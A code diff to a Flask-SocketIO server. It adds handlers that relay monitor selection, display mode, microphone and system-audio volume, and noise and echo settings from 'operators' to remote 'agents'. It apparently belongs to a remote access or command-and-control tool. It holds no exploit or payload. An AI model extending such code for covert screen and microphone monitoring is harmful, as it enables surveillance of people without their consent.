@@ -4597,6 +4597,58 @@ def handle_command_output(data):
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
 
+@socketio.on('get_monitors')
+def handle_get_monitors(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('get_monitors', {}, room=agent_sid)
+
+@socketio.on('monitors_list')
+def handle_monitors_list(data):
+    emit('monitors_list_update', data, room='operators', broadcast=True)
+
+@socketio.on('switch_monitor')
+def handle_switch_monitor_request(data):
+    agent_id = data.get('agent_id')
+    monitor_index = data.get('monitor_index')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('switch_monitor', {'monitor_index': monitor_index}, room=agent_sid)
+
+@socketio.on('set_display_mode')
+def handle_set_display_mode(data):
+    agent_id = data.get('agent_id')
+    mode = data.get('mode')
+    pip_monitor = data.get('pip_monitor')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('set_display_mode', {'mode': mode, 'pip_monitor': pip_monitor}, room=agent_sid)
+
+@socketio.on('set_audio_volumes')
+def handle_set_audio_volumes(data):
+    agent_id = data.get('agent_id')
+    mic_volume = data.get('mic_volume', 1.0)
+    system_volume = data.get('system_volume', 1.0)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('set_audio_volumes', {'mic_volume': mic_volume, 'system_volume': system_volume}, room=agent_sid)
+
+@socketio.on('toggle_noise_reduction')
+def handle_toggle_noise_reduction(data):
+    agent_id = data.get('agent_id')
+    enabled = data.get('enabled', False)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('toggle_noise_reduction', {'enabled': enabled}, room=agent_sid)
+
+@socketio.on('toggle_echo_cancellation')
+def handle_toggle_echo_cancellation(data):
+    agent_id = data.get('agent_id')
+    enabled = data.get('enabled', False)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
 @socketio.on('agent_heartbeat')
 def handle_agent_heartbeat(data):
     agent_id = data.get('agent_id')
